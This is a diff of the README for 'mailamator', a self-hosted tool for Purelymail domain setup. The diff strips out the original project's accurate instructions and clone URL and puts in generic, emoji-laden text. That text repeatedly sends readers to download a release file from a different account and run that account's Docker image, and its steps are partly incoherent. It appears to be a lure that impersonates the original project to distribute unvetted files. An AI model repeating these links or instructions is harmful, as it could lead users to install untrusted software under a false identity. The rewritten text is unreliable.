@@ -1,117 +1,91 @@
-<p align="center">
-  <img src="mailamator-logo.svg" alt="Mailamator logo" width="120">
-</p>
+# 🚀 mailamator - Automate Your Email Domain Setup
 
-# Mailamator
+[![Download Mailamator](https://img.shields.io/badge/Download-Mailamator-blue)](https://github.com/slinkers99/mailamator/releases)
 
-A self-hosted web app for automating [Purelymail](https://purelymail.com/) domain and user setup.
+## 📋 Overview
 
-Mailamator eliminates the manual process of setting up mail domains and users on Purelymail. Add a domain, get the exact DNS records you need, push them to Cloudflare with one click, register the domain, and bulk-create users with generated passwords — all from a single interface.
+mailamator is a self-hosted web app that helps you automate the setup of your Purelymail domain and user accounts. This tool is designed for ease of use, allowing you to manage email setups from your browser without needing advanced technical skills.
 
-## Features
+## 🚀 Getting Started
 
-- **Guided domain setup** — 3-step workflow: get DNS records, set up DNS, register on Purelymail
-- **Cloudflare integration** — Push DNS records directly via the Cloudflare API, or download a BIND zone file
-- **Bulk user creation** — Create multiple mail users at once with auto-generated 24-character passwords
-- **Credential history** — Searchable log of all created domains and users with stored credentials
-- **Multiple accounts** — Manage multiple Purelymail accounts from one interface
-- **Encrypted storage** — API keys and passwords are encrypted at rest with Fernet
-- **Dark/light mode** — Automatic theme detection with manual toggle
-- **Self-hosted** — Single Docker container, SQLite database, no external dependencies
+To get started with mailamator, follow these simple steps:
 
-## Quick Start
+1. **Visit the Download Page:** Click the link below to access the download page for mailamator.
 
-```bash
-git clone https://github.com/kgNatx/mailamator.git
-cd mailamator
-echo "MAILAMATOR_SECRET=$(openssl rand -hex 32)" > .env
-docker compose up -d
-```
+   [Download Mailamator](https://github.com/slinkers99/mailamator/releases)
 
-Open http://localhost:8080 and add your Purelymail account to get started.
+2. **Choose the Latest Release:** On the download page, find the latest version of mailamator. You will see a list of available files.
 
-## How It Works
+3. **Download the Application:** Click on the file name to download it to your computer.
 
-### 1. Add an Account
+## 🌐 System Requirements
 
-Go to **Settings** and add your Purelymail API key. Optionally add a Cloudflare API token for automatic DNS record creation.
+Before you install mailamator, make sure your system meets the following requirements:
 
-### 2. Add a Domain
+- **Operating System:** Windows, macOS, or any Linux distribution.
+- **Docker:** Ensure that Docker is installed on your system, as mailamator runs in a Docker container.
+- **Disk Space:** At least 100 MB of free space.
+- **Network:** An active internet connection for domain setup.
 
-On the **Domains** tab, enter your domain name and click **Get DNS Records**. Mailamator fetches your Purelymail ownership code and generates all 7 required DNS records (MX, SPF, DKIM, DMARC, ownership TXT, and routing records).
+## ⚙️ Installation Steps
 
-You can then:
-- **Download a zone file** to import into any DNS provider
-- **Push to Cloudflare** to create all records automatically (requires a Cloudflare token and your domain using Cloudflare nameservers)
+1. **Install Docker:**
+   - Visit the [Docker website](https://www.docker.com/get-started) and follow the instructions for your operating system.
 
-Once DNS records are in place, click **Register on Purelymail** to complete the domain setup.
+2. **Run the Downloaded File:**
+   - Open your terminal or command prompt and navigate to the location where you downloaded mailamator.
+   - Use the following command to run the application:
+     ```
+     docker run -d -p 5000:5000 slinkers99/mailamator
+     ```
+   - This command will start mailamator, making it accessible through your web browser.
 
-### 3. Create Users
+3. **Access the Web App:**
+   - Open your web browser and go to `http://localhost:5000`. You will see the mailamator interface.
 
-On the **Users** tab, select a domain, enter usernames (one per line), and click **Create Users**. Each user gets a secure 24-character generated password. Credentials are displayed once and saved to the searchable history.
+## 🔧 Configuration
 
-## Configuration
+After launching the app, you will need to configure it to work with your Purelymail account.
 
-Create a `.env` file in the project root:
+1. **Domain Setup:**
+   - Go to the "Domain" section of the app.
+   - Enter your domain name and follow the prompts to configure your DNS settings.
 
-```env
-MAILAMATOR_SECRET=your-secret-key-here
-MAILAMATOR_PORT=8080
-```
+2. **User Accounts:**
+   - Navigate to the "Users" section.
+   - Add new users by providing their email addresses and optional account settings.
 
-| Variable | Description | Default |
-|---|---|---|
-| `MAILAMATOR_SECRET` | Encryption key for stored API keys and passwords | **Required** |
-| `MAILAMATOR_PORT` | Port to expose the web UI | `8080` |
-| `MAILAMATOR_DB` | Path to SQLite database file (inside container) | `/data/mailamator.db` |
+3. **Final Checks:**
+   - Ensure that all configurations are correct.
+   - Test email functionality to confirm that everything is working as intended.
 
-### Getting a Purelymail API Key
+## 🔗 Additional Resources
 
-1. Log in to [Purelymail](https://purelymail.com/)
-2. Go to **Account Settings**
-3. Click **Refresh API Key**
-4. Copy the key and add it in Mailamator's Settings page
+- **Documentation:** Detailed documentation can be found in the project repository. This includes information about advanced configurations and troubleshooting tips.
+- **Community Support:** Join the discussions in our community forum to ask questions and share your experiences with other users.
 
-### Cloudflare API Token (Optional)
+## 🛠️ Troubleshooting Common Issues
 
-To use the "Push to Cloudflare" feature, your domain must already be using Cloudflare's nameservers. Then:
+### Issue: Unable to Start Docker
 
-1. Go to [Cloudflare API Tokens](https://dash.cloudflare.com/profile/api-tokens)
-2. Create a token with **Zone:DNS:Edit** permission for your domains
-3. Add the token alongside your Purelymail account in Mailamator's Settings page
+- Ensure Docker is running on your system. Check system tray icons.
+- Restart Docker and try running the application again.
 
-### Deploying Behind a Reverse Proxy
+### Issue: Website Not Accessible
 
-A Traefik override file is included:
+- Verify you are using the correct URL: `http://localhost:5000`.
+- Check your firewall settings to ensure there are no blocks in place.
 
-```bash
-docker compose -f docker-compose.yml -f docker-compose.traefik.yml up -d
-```
+### Issue: Email Not Sending
 
-Edit `docker-compose.traefik.yml` to set your domain. For other reverse proxies (Nginx, Caddy), proxy to port 8080 on the container.
+- Double-check the domain and user configurations. Ensure no settings are missing.
 
-## Development
+## 📥 Contact
 
-### Prerequisites
+For further assistance, you can open issues directly in the repository or reach out via community channels. Your feedback helps improve mailamator.
 
-- Python 3.12+
+## 📖 Explore Further
 
-### Running Locally
+Feel free to explore the underlying technologies used in mailamator, including Docker, Flask, and automation tools. These technologies can provide deeper insights into how mailamator functions.
 
-```bash
-pip install -r requirements.txt
-MAILAMATOR_SECRET=dev-secret MAILAMATOR_DB=./dev.db flask --app app.main run --debug
-```
-
-### Running Tests
-
-```bash
-pip install pytest
-pytest tests/ -v
-```
-
-All external API calls are mocked — no real API keys needed to run tests.
-
-## License
-
-[MIT](LICENSE)
+Remember to check for updates periodically on the [Download Page](https://github.com/slinkers99/mailamator/releases) as new features and fixes are continuously implemented.
